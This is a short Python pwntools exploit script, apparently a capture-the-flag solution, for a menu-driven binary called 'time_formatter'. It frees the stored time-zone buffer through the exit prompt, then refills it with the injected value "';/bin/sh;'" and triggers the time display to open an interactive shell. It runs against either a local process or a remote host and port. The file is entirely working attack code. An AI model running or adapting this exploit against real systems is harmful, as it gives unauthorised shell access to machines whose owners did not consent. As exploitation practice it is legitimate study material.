#!/usr/bin/env python3

from pwn import *

localfile = "./time_formatter"
locallibc = ""

def menu(idx):
    io.recvuntil("> ")
    io.sendline(str(idx))

def exp():
    menu(1)
    io.sendlineafter("Format: ", b"A" * 8)
    menu(3)
    io.sendlineafter("Time zone: ", b"A" * 32)
    menu(5)
    io.sendlineafter("Are you sure you want to exit (y/N)? ", "n")
    menu(3)
    io.sendlineafter("Time zone: ", "';/bin/sh;'")
    menu(4)
    io.interactive()



argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

exp()
